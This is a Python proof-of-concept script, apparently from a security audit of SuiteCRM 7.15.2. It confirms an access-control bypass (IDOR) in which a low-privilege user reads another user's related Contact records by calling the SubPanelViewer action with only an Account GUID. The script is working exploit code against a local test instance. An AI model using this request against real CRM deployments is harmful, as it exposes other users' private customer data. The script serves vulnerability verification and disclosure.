#!/usr/bin/env python3
"""
VULN-024 -- SubPanelViewer parent-ACL bypass (IDOR)

Target:   SuiteCRM 7.15.2 (targets/SuiteCRM/)
Sink:     include/SubPanel/SubPanelViewer.php:48-96
          (`new SubPanel($module, $_REQUEST['record'], $subpanel, ...)` then
          `->display()` -- no ACLAccess('DetailView') is ever called on the
          parent record identified by `record`).
Routing:  include/MVC/Controller/action_file_map.php:41
          `$action_file_map['subpanelviewer'] = 'include/SubPanel/SubPanelViewer.php';`
          i.e. `index.php?module=<M>&action=SubPanelViewer` bypasses the
          module's own MVC controller entirely and requires straight into
          this generic file.

What this script does
----------------------
1. Logs in as admin, creates two fresh low-priv users: V (victim) and A
   (attacker) -- no relationship between them.
2. As V: creates an Account and a Contact related to that Account
   (account_id = the Account's id). Both records are owned by V; A has no
   ACL grant, no Security-Group membership, and no relationship to either.
3. As A: requests the Account's "contacts" subpanel via SubPanelViewer,
   using ONLY the Account's GUID (no prior view of the Account itself).
4. Asserts A's response contains V's Contact's unique last_name marker --
   i.e. related-record data crossed the ownership boundary through a path
   that never calls ACLAccess('DetailView') on the parent.

Environment variables (defaults match claude_audit/SuiteCRM/SuiteCRM_summary.md):
    BASE_URL    (default http://localhost:33116)
    ADMIN_USER  (default admin)
    ADMIN_PASS  (default Admin@2026!)

Exit code 0 + "[OK]" on CONFIRMED, non-zero + "[FAIL]" otherwise.
"""
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict,
                      admin_session, create_user, web_login)

VULN_ID = "VULN-024"
HERE = os.path.dirname(os.path.abspath(__file__))


def save_evidence(request_txt, response_obj, resp_label="response"):
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(request_txt)
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {response_obj.status_code} {response_obj.reason}\n")
        for k, v in response_obj.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\n")
        f.write(response_obj.text[:20000])


def main():
    banner(VULN_ID, "SubPanelViewer parent-ACL bypass (IDOR) -- read another user's related records")

    log("SETUP", "admin web login")
    admin = admin_session()

    log("SETUP", "provisioning victim (V) and attacker (A) -- fresh, unrelated low-priv users")
    victim = create_user(admin, "Victim@2026x!")
    attacker = create_user(admin, "Attacker@2026x!")
    log("INFO", f"victim   = {victim['user_name']} ({victim['id']})")
    log("INFO", f"attacker = {attacker['user_name']} ({attacker['id']})")

    vs = web_login(victim["user_name"], victim["password"])

    log("SETUP", "as V: create an Account")
    acct_name = rand("V024Acc")
    r = vs.post(f"{BASE_URL}/index.php", data={
        "module": "Accounts", "action": "Save", "record": "", "name": acct_name,
    }, headers={"Referer": f"{BASE_URL}/index.php?module=Accounts&action=EditView"},
        allow_redirects=False, timeout=30)
    m = re.search(r"record=([0-9a-fA-F-]{36})", r.headers.get("Location", ""))
    if not m:
        verdict(VULN_ID, "FAILED", f"could not create victim Account (status={r.status_code})")
        sys.exit(1)
    acct_id = m.group(1)
    log("OK", f"Account created: {acct_id} ({acct_name}), owned by V")

    log("SETUP", "as V: create a Contact related to that Account (account_id set directly)")
    contact_last = rand("V024Contact")
    r = vs.post(f"{BASE_URL}/index.php", data={
        "module": "Contacts", "action": "Save", "record": "",
        "first_name": "Victim024", "last_name": contact_last,
        "account_id": acct_id, "account_name": acct_name,
    }, headers={"Referer": f"{BASE_URL}/index.php?module=Contacts&action=EditView"},
        allow_redirects=False, timeout=30)
    m = re.search(r"record=([0-9a-fA-F-]{36})", r.headers.get("Location", ""))
    if not m:
        verdict(VULN_ID, "FAILED", f"could not create victim Contact (status={r.status_code})")
        sys.exit(1)
    contact_id = m.group(1)
    log("OK", f"Contact created: {contact_id} (last_name={contact_last}), related to the Account, owned by V")

    log("STEP", "as A (zero relationship to V's Account/Contact): request the Account's 'contacts' subpanel via SubPanelViewer")
    params = {
        "module": "Accounts", "action": "SubPanelViewer", "record": acct_id,
        "subpanel": "contacts", "inline": "1", "ajaxSubpanel": "true",
    }
    request_txt = (
        f"GET /index.php?{'&'.join(f'{k}={v}' for k, v in params.items())} HTTP/1.1\n"
        f"Host: localhost:33116\n"
        f"Cookie: PHPSESSID=<attacker-session>\n"
        f"User-Agent: <browser>\n\n"
        f"# Attacker A ({attacker['user_name']}) has never viewed, been assigned,\n"
        f"# or been related to Account {acct_id} or Contact {contact_id} (both owned by V).\n"
    )

    as_ = web_login(attacker["user_name"], attacker["password"])
    r2 = as_.get(f"{BASE_URL}/index.php", params=params, timeout=30)
    save_evidence(request_txt, r2)

    log("PROOF", f"response status={r2.status_code} len={len(r2.text)}")
    leaked = contact_last in r2.text
    log("PROOF", f"victim Contact last_name marker {contact_last!r} present in A's subpanel response: {leaked}")

    if not leaked:
        verdict(VULN_ID, "FAILED", "attacker did not receive victim's related-record data")
        sys.exit(1)

    idx = r2.text.find(contact_last)
    snippet = r2.text[max(0, idx - 200):idx + 200]
    with open(os.path.join(HERE, "evidence", "leaked_subpanel_snippet.txt"), "w") as f:
        f.write(f"Attacker session, GET SubPanelViewer for Account {acct_id} (owned by victim {victim['id']})\n")
        f.write(f"Victim Contact id: {contact_id}, last_name marker: {contact_last}\n\n")
        f.write("--- snippet of attacker's HTTP response containing the leaked marker ---\n")
        f.write(snippet)

    log("OK", "attacker's SubPanelViewer response contains the victim-owned Contact's data")
    verdict(VULN_ID, "CONFIRMED",
            f"attacker read victim's related Contact ({contact_last}) via SubPanelViewer with zero ACL prompt")
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:  # noqa: BLE001
        log("FAIL", f"unhandled exception: {exc!r}")
        verdict(VULN_ID, "FAILED", f"unhandled exception: {exc}")
        sys.exit(1)
